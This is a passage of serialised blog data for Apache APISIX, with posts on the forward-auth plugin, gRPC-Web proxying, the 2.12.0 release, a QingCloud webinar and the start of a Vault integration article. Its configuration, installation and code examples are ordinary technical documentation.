Capabilities](https://apisix.apache.org/blog/2021/12/08/apisix-integrate-rocketmq-logger-plugin)\\n- [Apache APISIX Integrates with Google Cloud Logging to Improve Log Processing](https://apisix.apache.org/blog/2021/12/22/google-logging)\\n- [Apache APISIX Integrates with SkyWalking to Create a Full Range of Log Processing](https://apisix.apache.org/blog/2021/12/07/apisix-integrate-skywalking-plugin)"},{"id":"forward-auth Plugin for Authentication Function","metadata":{"permalink":"/blog/2022/01/26/apisix-integrate-forward-auth-plugin","source":"@site/blog/2022/01/26/apisix-integrate-forward-auth-plugin.md","title":"forward-auth Plugin for Authentication Function","description":"This article describes `forward-auth`, a new plugin in APISIX, and show the details on how to use this cleanly designed authentication model.","date":"2022-01-26T00:00:00.000Z","formattedDate":"January 26, 2022","tags":[{"label":"Authentication","permalink":"/blog/tags/authentication"},{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":3.31,"truncated":true,"authors":[{"name":"Zeping Bai","title":"Author","url":"https://github.com/bzp2010","image_url":"https://avatars.githubusercontent.com/u/8078418?v=4","imageURL":"https://avatars.githubusercontent.com/u/8078418?v=4"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Integrating Splunk HTTP Event Collector with API Gateway","permalink":"/blog/2022/02/10/splunk-apisix-integration"},"nextItem":{"title":"Integrate Apache APISIX with gRPC-Web","permalink":"/blog/2022/01/25/apisix-grpc-web-integration"}},"content":"> This article describes the use of `forward-auth`, a new plugin in Apache APISIX, and provides detailed instructions on how to use this cleanly designed authentication model.\\n\\n\x3c!--truncate--\x3e\\n\\nForward Auth cleverly moves the authentication and authorization logic to a dedicated external service, where the gateway forwards the user\'s request to the authentication service and blocks the original request and replaces the result when the authentication service responds with a non-20x status. In this way, it is possible to return a custom error or redirect the user to the authentication page if the authentication fails.\\n\\n## Principle\\n\\n![Plugin priciple](https://static.apiseven.com/202108/1643096414141-ccbc33c0-7899-445a-a2f8-b6d5341c44df.jpg)\\n\\nThe principle and flow of the `forward-auth plugin` in Apache APISIX is shown in the figure above and is summarized in the following steps.\\n\\n- Step 1: A request is made by the client to APISIX\\n- Step 2: APISIX makes a request to the user-configured authentication service\\n- Step 3: The authentication service responds (2xx or exception status)\\n- Step 4: Based on the authentication service response, APISIX will decide to forward the request upstream or send a rejection response directly to the client\\n\\n## How to use\\n\\n### Step 1: Set up the authentication service\\n\\nSuppose there is an authentication service to which the user sends a request with an Authorization request header. If this data passes authentication, a 200 status code and a response header named `X-User-ID` are returned; if it does not pass authentication, the authentication status is considered expired and a 302 status code and `Location` response header are returned to redirect the client to the login page.\\n\\n### Step 2: Create a route and enable the `forward-auth` plugin\\n\\nNext, we will configure a route and enable the `forward-auth` plugin to interface the above authentication service with the upstream application.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\": {\\n        \\"forward-auth\\": {\\n            \\"address\\": \\"http://127.0.0.1:9080/auth\\",\\n            \\"request_headers\\": [\\"Authorization\\"],\\n            \\"upstream_headers\\": [\\"X-User-ID\\"],\\n            \\"client_headers\\": [\\"Location\\"]\\n        }\\n    },\\n    \\"uri\\": \\"/user\\"\\n}\'\\n```\\n\\nThe above configuration details are explained.\\n\\n- When a request matches the current route, a request is sent to the `address` in address with the request header Authorization defined in `request_headers` (i.e., the request header configured to be forwarded by the client to the authentication service, if not set, no request header is forwarded), whereby the authentication service can confirm the user\'s identity.\\n- If the authentication passes, the status code is 200 and returns an `X-User-ID` as defined in `upstream_headers` (i.e. the request header to be forwarded upstream by the authentication service when the authentication passes, if not set, no request header is forwarded).\\n- If authentication fails, the status code is 302 and returns a `Location` as defined in `client_headers` (i.e., the response header sent by the authentication service to the client if authentication fails, or no response header if it is not set).\\n\\n### Step 3: Test Requests\\n\\n```shell\\n# Request and send data using POST\\ncurl http://127.0.0.1:9080/user \\\\\\n    --header \'Authorization: true\'\\n\\nHTTP/1.1 200 OK\\nContent-Type: application/json\\nContent-Length: 28\\nServer: APISIX/2.11.0\\n\\n{\\"user_id\\":\\"i-am-real-user\\"}\\n\\n# Request using GET\\ncurl -i http://127.0.0.1:9080/user \\\\\\n    --header \'Authorization: false\'\\n\\nHTTP/1.1 302 FOUND\\nServer: APISIX/2.11.0\\nLocation: https://example.com/auth\\n```\\n\\n### Addendum: Disable the plugin\\n\\nIf you have finished using the Forward Auth plugin, simply remove the `forward-auth` plugin configuration from the route configuration and save it to turn off the Forward Auth plugin on the route.\\n\\nThanks to the dynamic nature of Apache APISIX, there is no need to restart Apache APISIX to turn the plugin on and off.\\n\\n## Summary\\n\\nTo get more information about the `forward-auth` plugin description and full configuration list, you can refer to the [official documentation](https://apisix.apache.org/docs/apisix/next/plugins/forward-auth). Also, if you have more complex authentication or authorization application scenarios, try using the `opa` plugin, which allows for more powerful functionality in a programmable way.\\n\\nApache APISIX is also currently working on additional plugins to support the integration of additional services, so if you are interested, feel free to start a discussion in [GitHub Discussion](https://github.com/apache/apisix/discussions), or via the [mailing list]( https://apisix.apache.org/zh/docs/general/join) to communicate."},{"id":"Integrate Apache APISIX with gRPC-Web","metadata":{"permalink":"/blog/2022/01/25/apisix-grpc-web-integration","source":"@site/blog/2022/01/25/apisix-grpc-web-integration.md","title":"Integrate Apache APISIX with gRPC-Web","description":"APISIX has broadened the scope of support for the gRPC ecosystem. This article will introduce details of using the gRPC web protocol request proxy.","date":"2022-01-25T00:00:00.000Z","formattedDate":"January 25, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"},{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":5.76,"truncated":true,"authors":[{"name":"Jinchao Shuai","title":"Author","url":"https://github.com/shuaijinchao","image_url":"https://avatars.githubusercontent.com/u/8529452?v=4","imageURL":"https://avatars.githubusercontent.com/u/8529452?v=4"},{"name":"Yilin Zeng","title":"Technical Writer","url":"https://github.com/yzeng25","image_url":"https://avatars.githubusercontent.com/u/36651058?v=4","imageURL":"https://avatars.githubusercontent.com/u/36651058?v=4"}],"prevItem":{"title":"forward-auth Plugin for Authentication Function","permalink":"/blog/2022/01/26/apisix-integrate-forward-auth-plugin"},"nextItem":{"title":"Release Apache APISIX 2.12.0","permalink":"/blog/2022/01/25/release-apache-apisix-2.12"}},"content":"> Apache APISIX already supports gRPC protocol proxies, as well as HTTP(s) to gRPC Server proxies via the gRPC Transcode plugin. Through active community discussion and contributions, Apache APISIX has broadened the scope of support for the gRPC ecosystem: support for the gRPC Web Protocol Request Proxy.\\n\\n\x3c!--truncate--\x3e\\n\\n## gRPC Web Introduction\\n\\nOriginally developed by Google, gRPC is a high-performance remote procedure call framework implemented on HTTP/2. However, because browsers do not directly expose HTTP/2, Web applications cannot use gRPC directly. gRPC Web is a standardized protocol that solves this problem.\\n\\nThe first gRPC-web implementation was released in 2018 as a JavaScript library through which Web applications can communicate directly with the gRPC service. The principle is to create an end-to-end gRPC pipeline compatible with HTTP/1.1 and HTTP/2. The browser then sends a regular HTTP request, and a gRPC-Web proxy located between the browser and the server translates the request and response. Similar to gRPC, gRPC Web uses a predefined contract between the Web client and the back-end gRPC service. protocol Buffers are used to serialize and encode messages.\\n\\n![how gRPC-web works](https://static.apiseven.com/202108/1643099754071-1f5c3c68-f2bc-4746-95f5-cc083ace554b.png)\\n\\nWith gRPC Web, users can call back-end gRPC applications directly using a browser or Node client. However, there are some limitations to using gRPC-Web on the browser side to call gRPC services.\\n\\n- Client-side streaming and bi-directional streaming calls are not supported.\\n- Calling gRPC services across domains requires CORS to be configured on the server side.\\n- The gRPC server side must be configured to support gRPC-Web, or a third-party service agent must be available to translate the call between the browser and the server.\\n\\n## Apache APISIX gRPC Web Proxy\\n\\nApache APISIX supports the proxy of gRPC Web protocol by means of a plug-in, which completes the protocol conversion and data codec work when gRPC Web communicates with gRPC Server in the `grpc-web` plug-in, and its communication process is as follows.\\n\\ngRPC Web Client -> Apache APISIX (protocol conversion & data codec) -> gRPC server\\n\\nThe following is a complete example showing how to build a gRPC Web Client and proxy gRPC Web requests through Apache APISIX. In the following example, we will use Go as the gRPC Server server handler and Node as the gRPC Web client requestor.\\n\\n## Configure Protocol Buffer\\n\\nThe first step is to install the Protocol Buffer compiler and related plug-ins.\\n\\n1. Install `protoc` and `proto-grpc-*`.\\n\\n   The Protocol Buffer compiler `protoc` and the `protoc-gen-go` and `protoc-gen-grpc-web` plugins for generating Go, JavaScript, and gRPC web interface code for `.proto` need to be installed on your system before writing client and server-side applications.\\n\\n   Please run the following script to install the above components.\\n\\n   ```bash\\n   #!/usr/bin/env bash\\n\\n    set -ex\\n\\n    PROTOBUF_VERSION=\\"3.19.0\\"\\n    wget https://github.com/protocolbuffers/protobuf/releases/download/v${PROTOBUF_VERSION}/protoc-${PROTOBUF_VERSION}-linux-x86_64.zip\\n    unzip protoc-${PROTOBUF_VERSION}-linux-x86_64.zip\\n    mv bin/protoc /usr/local/bin/protoc\\n    mv include/google /usr/local/include/\\n    chmod +x /usr/local/bin/protoc\\n\\n    PROTO_GO_PLUGIN_VER=\\"1.2.0\\"\\n    wget https://github.com/grpc/grpc-go/releases/download/cmd/protoc-gen-go-grpc/v${PROTO_GO_PLUGIN_VER}/protoc-gen-go-grpc.v${PROTO_GO_PLUGIN_VER}.linux.amd64.tar.gz\\n    tar -zxvf protoc-gen-go-grpc.v${PROTO_GO_PLUGIN_VER}.linux.amd64.tar.gz\\n    mv protoc-gen-go-grpc /usr/local/bin/protoc-gen-go\\n    chmod +x /usr/local/bin/protoc-gen-go\\n\\n    PROTO_JS_PLUGIN_VER=\\"1.3.0\\"\\n    wget https://github.com/grpc/grpc-web/releases/download/${PROTO_JS_PLUGIN_VER}/protoc-gen-grpc-web-${PROTO_JS_PLUGIN_VER}-linux-x86_64\\n    mv protoc-gen-grpc-web-${PROTO_JS_PLUGIN_VER}-linux-x86_64 /usr/local/bin/protoc-gen-grpc-web\\n    chmod +x /usr/local/bin/protoc-gen-grpc-web\\n   ```\\n\\n2. Create the `SayHello` example `proto` file.\\n\\n   ```go\\n    // a6/echo.proto\\n\\n    syntax = \\"proto3\\";\\n\\n    package a6;\\n\\n    option go_package = \\"./;a6\\";\\n\\n    message EchoRequest {\\n    string message = 1;\\n    }\\n\\n    message EchoResponse {\\n    string message = 1;\\n    }\\n\\n    service EchoService {\\n    rpc Echo(EchoRequest) returns (EchoResponse);\\n    }\\n   ```\\n\\n## Configure the server-side application\\n\\n1. Generate server-side Go raw messages and service/client stubs.\\n\\n   ```bash\\n   protoc -I./a6 echo.proto --go_out=plugins=grpc:./a6\\n   ```\\n\\n2. Implement the server-side handler interface.\\n\\n   ```go\\n   // a6/echo.impl.go\\n\\n    package a6\\n\\n    import (\\n    \\"errors\\"\\n    \\"golang.org/x/net/context\\"\\n    )\\n\\n    type EchoServiceImpl struct {\\n    }\\n\\n    func (esi *EchoServiceImpl) Echo(ctx context.Context, in *EchoRequest) (*EchoResponse, error) {\\n    if len(in.Message) <= 0 {\\n        return nil, errors.New(\\"message invalid\\")\\n    }\\n    return &EchoResponse{Message: \\"response: \\" + in.Message}, nil\\n    }\\n   ```\\n\\n3. The server-side application runtime entry file.\\n\\n   ```go\\n   // server.go\\n    package main\\n\\n    import (\\n    \\"fmt\\"\\n    \\"log\\"\\n    \\"net\\"\\n\\n    \\"apisix.apache.org/example/a6\\"\\n    \\"google.golang.org/grpc\\"\\n    )\\n\\n    func main() {\\n    lis, err := net.Listen(\\"tcp\\", fmt.Sprintf(\\":%d\\", 50001))\\n    if err != nil {\\n        log.Fatalf(\\"failed to listen: %v\\", err)\\n    }\\n\\n    grpcServer := grpc.NewServer()\\n    a6.RegisterEchoServiceServer(grpcServer, &a6.EchoServiceImpl{})\\n\\n    if err = grpcServer.Serve(lis); err != nil {\\n        log.Fatalf(\\"failed to serve: %s\\", err)\\n    }\\n    }\\n   ```\\n\\n4. Compile and start the server-side service.\\n\\n   ```bash\\n   go build -o grpc-server server.go\\n   ./grpc-server\\n   ```\\n\\n## Configure client programs\\n\\n1. Generate client-side `proto` code.\\n\\n   Generate client-side JavaScript raw messages, service/client stubs and interface code for gRPC Web\'s JavaScript.\\n\\n   The `proto` plugin for gRPC Web provides two modes of code generation.\\n\\n   1. mode=grpcwebtext: The default generated code sends the payload in grpc-web-text format.\\n\\n   - Content-type: application/grpc-web-text\\n   - Payload uses base64 encoding\\n   - Supports monadic and server streaming calls\\n\\n   1. mode=grpcweb: send payload in binary protobuf format.\\n\\n   - Content-type: application/grpc-web+proto\\n   - Payload is in binary protobuf format\\n   - Currently only monadic calls are supported\\n  \\n  ```bash\\n  $ protoc -I=./a6 echo.proto --js_out=import_style=commonjs:./a6 --grpc-web_out=import_style=commonjs,mode=grpcweb:./a6\\n  ```\\n\\n2. Installing client-side dependencies.\\n\\n   ```shell\\n   $ npm i grpc-web\\n   $ npm i google-protobuf\\n   ```\\n\\n3. Execute entry file on client-side.\\n\\n   ```shell\\n   // client.js\\n   const {EchoRequest} = require(\'./a6/echo_pb\');\\n   const {EchoServiceClient} = require(\'./a6/echo_grpc_web_pb\');\\n   // connect to  the entrance of Apache APISIX\\n   let echoService = new EchoServiceClient(\'http://127.0.0.1:9080\');\\n\\n   let request = new EchoRequest();\\n   request.setMessage(\\"hello\\")\\n\\n   echoService.echo(request, {}, function (err, response) {\\n       if (err) {\\n            console.log(err.code);\\n            console.log(err.message);\\n        } else {\\n            console.log(response.getMessage());\\n        }\\n    });\\n   ```\\n\\n4. Final project structure\\n\\n   ```bash\\n   $ tree .\\n    \u251c\u2500\u2500 a6\\n    \u2502   \u251c\u2500\u2500 echo.impl.go\\n    \u2502   \u251c\u2500\u2500 echo.pb.go\\n    \u2502   \u251c\u2500\u2500 echo.proto\\n    \u2502   \u251c\u2500\u2500 echo_grpc_web_pb.js\\n    \u2502   \u2514\u2500\u2500 echo_pb.js\\n    \u251c\u2500\u2500 client.js\\n    \u251c\u2500\u2500 server.go\\n    \u251c\u2500\u2500 go.mod\\n    \u251c\u2500\u2500 go.sum\\n    \u251c\u2500\u2500 package.json\\n    \u2514\u2500\u2500 package-lock.json\\n   ```\\n\\nAfter completing the above steps, you have configured the gRPC Server server application and the gRPC Web client application, and started the server application, which will receive requests on port `50001`.\\n\\n## Configure Apache APISIX\\n\\nNext, simply enable the `grpc-web` plugin in the Apache APISIX routing plugin configuration to proxy gRPC web requests.\\n\\n1. Enable the `grpc-web` proxy plugin.\\n\\n   Routing must use **prefix matching** (e.g., `/* or /grpc/example/*`), because the gRPC web client passes the package name, service interface name, method name, etc. declared in `proto` in the URI (e.g., `/path/a6.EchoService/Echo`), **using absolute match will prevent the plugin from extracting `proto` information from the URI**.\\n\\n   ```shell\\n   $ curl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n    {\\n        \\"uri\\":\\"/*\\", // prefix matching mode\\n        \\"plugins\\":{\\n            \\"grpc-web\\":{} // enable gRPC Web plugin\\n        },\\n        \\"upstream\\":{\\n            \\"scheme\\":\\"grpc\\",\\n            \\"type\\":\\"roundrobin\\",\\n            \\"nodes\\":{\\n                \\"127.0.0.1:50001\\":1 // gRPC Server Listen \u5730\u5740\u548c\u7aef\u53e3\\n            }\\n        }\\n    }\'\\n   ```\\n\\n2. Validate gRPC Web Proxy Requests.\\n\\n   The gRPC Web protocol request can be sent to Apache APISIX by executing `client.js` from Node.\\n\\n   The above client-side and server-side processing logic are respectively: the client sends a message to the server with the content `hello`, the server receives the message and responds with `response: hello`, and the execution result is as follows.\\n\\n   ```shell\\n   $ node client.js\\n   response: hello\\n   ```\\n\\n3. Disable the `grpc-web` proxy plugin.\\n\\n   Simply remove the grpc-web attribute from the routing plugin configuration.\\n\\n   ```shell\\n   $ curl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n    {\\n        \\"uri\\":\\"/*\\",\\n        \\"plugins\\":{\\n        },\\n        \\"upstream\\":{\\n            \\"scheme\\":\\"grpc\\",\\n            \\"type\\":\\"roundrobin\\",\\n            \\"nodes\\":{\\n                \\"127.0.0.1:50001\\":1\\n            }\\n        }\\n    }\'\\n   ```\\n\\n## Summary\\n\\nThis article brings you hands-on experience about using `grpc-web` in Apache APISIX.\\n\\nFeel free to start a discussion in [GitHub Discussions](https://github.com/apache/apisix/discussions) or communicate via the [mailing list](https://apisix.apache.org/zh/docs/general/join)."},{"id":"Release Apache APISIX 2.12.0","metadata":{"permalink":"/blog/2022/01/25/release-apache-apisix-2.12","source":"@site/blog/2022/01/25/release-apache-apisix-2.12.md","title":"Release Apache APISIX 2.12.0","description":"The first version with new features in 2022. Support more authentication plugins and Serverless integration, rich log functions and more details.","date":"2022-01-25T00:00:00.000Z","formattedDate":"January 25, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":4.795,"truncated":true,"authors":[{"name":"Zexuan Luo","title":"Author","url":"https://github.com/spacewander","image_url":"https://avatars.githubusercontent.com/u/4161644?v=4","imageURL":"https://avatars.githubusercontent.com/u/4161644?v=4"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Integrate Apache APISIX with gRPC-Web","permalink":"/blog/2022/01/25/apisix-grpc-web-integration"},"nextItem":{"title":"Webinar | APISIX in QingCloud! ","permalink":"/blog/2022/01/24/apisix-with-qingcloud-meetup"}},"content":"> Following the release of version 2.11.0, Apache APISIX will also bring you the first version with new features in 2022 during the upcoming Spring Festival.\\n\\n\x3c!--truncate--\x3e\\n\\n## New Feature: More Serverless Integrations\\n\\nRemember that in the last release, Apache APISIX added support for Azure Function. This new version is also full of intention, adding support for more Serverless vendors in the feature set.\\n\\nUsers can now also combine AWS Lambda and Apache OpenWhisk in Apache APISIX to expose specific functions on the gateway.\\n\\n## New features: More Authentication Plugins\\n\\nThis new release also brings two new plugins that we\'ve been waiting for: `forward-auth` and `opa`.\\n\\n- The `forward-auth` plugin is similar to Traefik\'s plugin of the same name, which allows sending the information of the current request to an external service for authentication.\\n- The `opa` plugin integrates with the well-known Open Policy Agent, which can perform complex authentication functions via OPA.\\n\\nThese two plugins will add to the authentication functionality of Apache APISIX, giving users richer and easier authentication operations.\\n\\n## New features: More Logging Features\\n\\nIn addition to the authentication plugins mentioned above, this new release will also bring three new logging plugins: `google-cloud-logging`, `splunk-hec-logging` and `rocketmq-logger`.\\n\\nIn the future, Apache APISIX will connect to more and more logging service providers and open source brokers to make logging easier.\\n\\n### Support for logging response bodies\\n\\nThe 2.12.0 release also supports logging of response bodies at the logging level. As with other Apache APISIX features, this feature can be enabled dynamically via expressions. This makes it possible to log only when a specific Content-Type and Content-Length is returned upstream, without having to worry about the problems associated with full response body collection.\\n\\nAn example can be found below.\\n\\n```json\\n{\\n    \\"plugins\\": {\\n        \\"kafka-logger\\": {\\n            \\"broker_list\\" : {\\n                \\"127.0.0.1\\":9092\\n            },\\n            \\"kafka_topic\\" : \\"test2\\",\\n            \\"include_resp_body\\": true,\\n            \\"include_resp_body_expr\\": [\\n                [\\n                    \\"sent_http_content_length\\",\\n                    \\"<\\",\\n                    \\"4096\\"\\n                ],\\n                [\\n                    \\"sent_http_content_type\\",\\n                    \\"==\\",\\n                    \\"application/json\\"\\n                ],\\n            ]\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        },\\n        \\"type\\": \\"roundrobin\\"\\n    },\\n    \\"uri\\": \\"/hello\\"\\n}\\n```\\n\\n> The above configuration will log only when Content-Length < 4096 and Content-Type is \\"application/json\\".\\n\\n### Support for registering custom variables\\n\\nAnother feature closely related to logging is that the new version of Apache APISIX now supports registration of custom variables. Combined with APISIX\'s custom logging format, it is possible to fully customize the reported log content. This means that log generation and reporting can be decoupled without modifying specific logging plugins. Here is a simple demonstration with an example.\\n\\nFor example, we can register a variable a6_route_labels in our own plug-in.\\n\\n```c\\nlocal core = require \\"apisix.core\\"\\n\\ncore.ctx.register_var(\\"a6_route_labels\\", function(ctx)\\n    local route = ctx.matched_route and ctx.matched_route.value\\n    if route and route.labels then\\n        return route.labels\\n    end\\n    return nil\\nend)\\n```\\n\\nAnd use it in a custom log format.\\n\\n```json\\n{\\n    \\"log_format\\": {\\n        \\"host\\": \\"$host\\",\\n        \\"labels\\": \\"$a6_route_labels\\",\\n        \\"client_ip\\": \\"$remote_addr\\"\\n    }\\n}\\n```\\n\\nSuppose our Route looks like this.\\n\\n```json\\n{\\n    \\"plugins\\": {\\n        \\"http-logger\\": {\\n            \\"uri\\": \\"http://127.0.0.1:1980/log\\",\\n            \\"batch_max_size\\": 1,\\n            \\"concat_method\\": \\"json\\"\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1982\\": 1\\n        },\\n        \\"type\\": \\"roundrobin\\"\\n    },\\n    \\"labels\\": {\\n        \\"k\\": \\"v\\"\\n    },\\n    \\"uri\\": \\"/hello\\"\\n}\\n```\\n\\nEventually you will receive the log as shown below.\\n\\n```\\n{\\"client_ip\\":\\"127.0.0.1\\",\\"host\\":\\"localhost\\",\\"labels\\":{\\"k\\":\\"v\\"},\\"route_id\\":\\"1\\"}\\n```\\n\\n## New: L4 Proxy Support for TLS over TCP Upstream\\n\\nWith the new Upstream Scheme introduced in version 2.12.0, Apache APISIX now supports proxying to TLS over TCP.\\n\\nSee below for details, just specify Scheme as TLS in the Upstream configuration.\\n\\n```json\\n{\\n    \\"scheme\\": \\"tls\\",\\n    \\"nodes\\": {\\n        \\"127.0.0.1:1995\\": 1\\n    },\\n    \\"type\\": \\"roundrobin\\"\\n}\\n```\\n\\nThe TCP proxy feature of Apache APISIX is now fully supported by TLS. In addition, we also support configuring the Access Log of the L4 proxy in a static file.\\n\\n```\\nstream:\\n    enable_access_log: false         # enable access log or not, default false\\n    access_log: logs/access_stream.log\\n    access_log_format: \\"$remote_addr [$time_local] $protocol $status $bytes_sent $bytes_received $session_time\\"\\n                                            # create your custom log format by visiting http://nginx.org/en/docs/varindex.html\\n    access_log_format_escape: default       # allows setting json or default characters escaping in variables\\n```\\n\\n## Update: Multi-language plug-ins continue to improve\\n\\n### WASM ecosystem is more feature-rich\\n\\nIn previous releases, Apache APISIX has opened up support for the WASM ecosystem. In version 2.12.0, a number of details have been updated for the WASM ecosystem.\\n\\nApache APISIX now supports running WASM code at the header_filter stage, making up for the fact that existing external plugins cannot modify the response.\\n\\nIn addition, we also support HTTP communication inside WASM through Apache APISIX as a host. With this feature, we have also re-implemented the forward-auth plugin with WASM. The functionality of the plugin is almost identical to the Lua version, and even the test cases pass with a name change from the Lua version.\\n\\n### Java Plugin Runner latest version released\\n\\nOf course, we haven\'t forgotten to update for existing external plugins, and with this 2.12.0 release, Apache APISIX now allows external plugins to fetch request bodies.\\n\\nFor example, the recent release of Java Plugin Runner version 2 includes this feature. The new version of the Java Plugin Runner also supports dynamic fetching of APISIX variables at runtime.\\n\\n## More details\\n\\nIn addition to the new features and components mentioned above, Apache APISIX version 2.12.0 has been updated with the following features.\\n\\n- gRPC-Web support: After gRPC proxies and HTTP to gRPC, we welcome the third member of the gRPC family. Apache APISIX now also supports the proxy gRPC Web protocol.\\n- `limit-count` enhancements: The `limit-count` plugin now supports sharing of counters between requests and routes, which is quite flexible.\\n\\nMore details about the Apache APISIX 2.12.0 update can be found in the [Change log](https://github.com/apache/apisix/blob/release/2.12/CHANGELOG.md#2120) corresponding to this release.\\n\\n## Download\\n\\nTo obtain the latest version of Apache APISIX 2.12.0, you can download it via the following path.\\n\\n- Source code: Please visit [Download page](https://apisix.apache.org/downloads/)\\n- Binary installation package: Please visit [Installation Guide](https://apisix.apache.org/zh/docs/apisix/how-to-build/)"},{"id":"Webinar | APISIX in QingCloud! ","metadata":{"permalink":"/blog/2022/01/24/apisix-with-qingcloud-meetup","source":"@site/blog/2022/01/24/apisix-with-qingcloud-meetup.md","title":"Webinar | APISIX in QingCloud! ","description":"On January 28th, the Apache APISIX community is joining forces with QingCloud to bring you an online sharing session.","date":"2022-01-24T00:00:00.000Z","formattedDate":"January 24, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":0.905,"truncated":true,"authors":[],"prevItem":{"title":"Release Apache APISIX 2.12.0","permalink":"/blog/2022/01/25/release-apache-apisix-2.12"},"nextItem":{"title":"HashiCorp Vault Secure Storage Backend in Apache APISIX Ecosystem","permalink":"/blog/2022/01/21/apisix-hashicorp-vault-integration"}},"content":"> on January 28th,the Apache APISIX community is joining forces with the QingCloud to bring you an online sharing session.\\n\\n\x3c!--truncate--\x3e\\n\\n![Meetup Post](https://static.apiseven.com/202108/1642747652149-53306a20-6fa8-48a0-8433-a3a625cf2cb9.png)\\n\\n## Topic 1: API gateway to the cloud, how to define a good API gateway\\n\\n### Speakers\\n\\nQing Liu, Product Manager of QingCloud API Gateway\\n\\nLian Zhai, Architecturer of QingCloud API Gateway\\n\\n### Topic Details\\n\\n1. Why does the API gateway cloud solve the pain points of users\\n2. How do we understand and define a good API gateway product\\n3. Important product features, functions and application scenarios of QingCloud API Gateway\\n\\n## Topic 2: Running Apache APISIX in the Hybrid Cloud\\n\\n### Speaker\\n\\nWei Jin, API7 Engineer, Apache APISIX PMC, Apache APISIX Ingress Controller Founder\\n\\n### Topic Details\\n\\n1. Apache APISIX integration with various public clouds (plug-ins and real-world applications)\\n2. Architecture and practice of Apache APISIX under hybrid cloud\\n3. The practice of Apache APISIX in public cloud\\n\\n## How to participate\\n\\nScan the code to follow Apache APISIX\'s video account below. We look forward to meeting you on the afternoon of January 28th!\\n\\n![QR code](https://static.apiseven.com/202108/1642745385238-f661f79d-d429-41d0-95b9-ad85d8d08ce0.png)"},{"id":"HashiCorp Vault Secure Storage Backend in Apache APISIX Ecosystem","metadata":{"permalink":"/blog/2022/01/21/apisix-hashicorp-vault-integration","source":"@site/blog/2022/01/21/apisix-hashicorp-vault-integration.md","title":"HashiCorp Vault Secure Storage Backend in Apache APISIX Ecosystem","description":"This article describe the upcoming release of the Vault with Apache APISIX integration, and show the details of configuration.","date":"2022-01-21T00:00:00.000Z","formattedDate":"January 21, 2022","tags":[{"label":"Authentication","permalink":"/blog/tags/authentication"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"},{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":12.245,"truncated":true,"authors":[{"name":"Bisakh Mondal","title":"Author","url":"https://github.com/bisakhmondal","image_url":"https://avatars.githubusercontent.com/u/41498427?v=4","imageURL":"https://avatars.githubusercontent.com/u/41498427?v=4"},{"name":"Yilin Zeng","title":"Technical Writer","url":"https://github.com/yzeng25","image_url":"https://avatars.githubusercontent.com/u/36651058?v=4","imageURL":"https://avatars.githubusercontent.com/u/36651058?v=4"}],"prevItem":{"title":"Webinar | APISIX in QingCloud! ","permalink":"/blog/2022/01/24/apisix-with-qingcloud-meetup"},"nextItem":{"title":"Get More Details About xRPC","permalink":"/blog/2022/01/21/apisix-xrpc-details-and-miltilingual"}},"content":"> This article describe the upcoming release of the Vault with Apache APISIX integration, and show the details of configuration.\\n\\n\x3c!--truncate--\x3e\\n\\nWith the rise of microservice-based architecture, keeping things secure has become much more challenging than earlier. We are far beyond the point where our 100 instances of backend servers are accessing our database server with a single static secret credential because if in case of a credential leakage the whole system is compromised and revocation of that credential causes a massive service outage (now no one can access anything unless the instances are reconfigured). We can\'t eliminate the possibility of a security breach because sometimes unexpected does happen. Instead, it\'s totally up to us to control the blast radius in these situations. To tackle scenarios like this, a popular solution like [HashiCorp Vault](https://www.vaultproject.io/) comes into the picture in a production environment to act as an identity-based secrets and encryption management system. In this article, I have demonstrated how to integrate Vault with Apache APISIX (a cloud-native API Gateway) [jwt-auth plugin](https://apisix.apache.org/docs/apisix/plugins/jwt-auth) to effectively use excellence from both worlds.\\n\\n## What is Vault\\n\\nHashiCorp Vault is designed to help organizations manage access to secrets and transmit them safely within an organization. Secrets are defined as any form of sensitive credentials that need to be tightly controlled and monitored and can be used to unlock sensitive information. Secrets could be in the form of passwords, API keys, SSH keys, RSA tokens, or OTP. In the real world where it is very common to have a secret sprawl where secrets get stored into the config file or as a variable in actual program code which as a consequence sometimes even end up in a version control system like GitHub, BitBucket or GitLab, possess a major threat in security. Vault solves this problem by centralizing secrets. It provides encrypted storage for static secrets, generation of dynamic secrets with a TTL lease, authentication of users (machines or humans) to make sure they\u2019re authorized to access a particular secret and many more. So that even in case of a security breach the blast radius is much small and contained.\\n\\nVault makes it very easy to control and manage access by providing us with a unilateral interface to manage every secret in your infrastructure. Not only that, it also provides the flexibility to create detailed audit logs and keep track of who accessed what.\\n\\n![HashiCorp Vault](https://static.apiseven.com/202108/1642770417379-a91960a5-5aac-45fa-9277-801a4ee2afc6.png)\\n\\n## About APISIX jwt-auth Plugin\\n\\nIt is an authentication plugin that can be attached to any APISIX route to perform JWT (JSON web token, [read more](https://jwt.io/introduction)) authentication before the request gets forwarded to the upstream URI. In short, it is a secure authentication mechanism that leads to authorization to critical resources. Typically, a private key, or a text secret, is used by the issuer to sign the JWT. The receiver of the JWT will verify the signature to ensure that the token hasn\u2019t been altered after it was signed by the issuer. The total integrity of the whole jwt mechanism depends on the signing secret (may it be a text secret of RSA keypairs). That makes it difficult for unauthenticated 